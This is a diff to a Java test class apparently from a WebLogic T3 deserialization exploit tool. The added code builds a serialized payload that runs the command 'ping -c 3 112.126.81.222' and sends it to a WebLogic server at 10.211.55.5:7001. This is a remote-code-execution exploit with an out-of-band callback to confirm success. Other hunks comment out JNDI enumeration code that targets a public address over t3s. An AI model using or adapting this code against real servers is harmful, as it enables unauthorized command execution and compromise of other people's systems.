@@ -36,11 +36,15 @@ public class T3Test {
 
     public static void main(String[] args) throws Exception {
 
+        Options options = new Options();
+        options.addOption("https",false,"xx");
+        CommandLineParser parser = new DefaultParser();
+        Main.cmdLine = parser.parse(options, args);
 
-//        Options options = new Options();
-//        options.addOption("https",false,"xx");
-//        CommandLineParser parser = new DefaultParser();
-//        Main.cmdLine = parser.parse(options, args);
+        byte[] paload = SerialDataGenerator.serialBlindDatas(new String[]{"ping -c 3 112.126.81.222"});
+        T3ProtocolOperation.send("10.211.55.5", "7001", paload);
+
+//
 //
 //        Socket s = SocketFactory.newSocket("77.246.34.226", 443);
 //        //AS ABBREV_TABLE_SIZE HL remoteHeaderLength 用来做skip的
@@ -197,26 +201,26 @@ public class T3Test {
 //        System.out.println("result="+br.readLine());
 //        s.close();
 
-        System.setProperty("weblogic.rjvm.enableprotocolswitch","true");
-        System.setProperty("UseSunHttpHandler","true");
-        System.setProperty("ssl.SocketFactory.provider" , "sun.security.ssl.SSLSocketFactoryImpl");
-        System.setProperty("ssl.ServerSocketFactory.provider" , "sun.security.ssl.SSLSocketFactoryImpl");
+//        System.setProperty("weblogic.rjvm.enableprotocolswitch","true");
+//        System.setProperty("UseSunHttpHandler","true");
+//        System.setProperty("ssl.SocketFactory.provider" , "sun.security.ssl.SSLSocketFactoryImpl");
+//        System.setProperty("ssl.ServerSocketFactory.provider" , "sun.security.ssl.SSLSocketFactoryImpl");
 
 
 
-        Context initialContext = Main.getInitialContext("t3s://" + "77.246.34.226" + ":" + 443);
+//        Context initialContext = Main.getInitialContext("t3s://" + "77.246.34.226" + ":" + 443);
 //        Context initialContext = Main.getInitialContext("t3://" + "10.211.55.5" + ":" + 7001);
 
 //        NamingNode remote = (NamingNode) initialContext.lookup("weblogic");
 //        System.out.println(remote.toString());
 
 //        System.out.println(initialContext.);
-        System.out.println(initialContext.getEnvironment());
-        NamingEnumeration namingEnumeration = initialContext.list("");
-        while (namingEnumeration.hasMoreElements()) {
-            System.out.println(namingEnumeration.next().getClass().getName());
-
-        }
+//        System.out.println(initialContext.getEnvironment());
+//        NamingEnumeration namingEnumeration = initialContext.list("");
+//        while (namingEnumeration.hasMoreElements()) {
+//            System.out.println(namingEnumeration.next().getClass().getName());
+//
+//        }
 
 //        weblogic.jndi.internal.WLContextImpl serverNamingNode = (weblogic.jndi.internal.WLContextImpl) initialContext.lookup("weblogic");
 
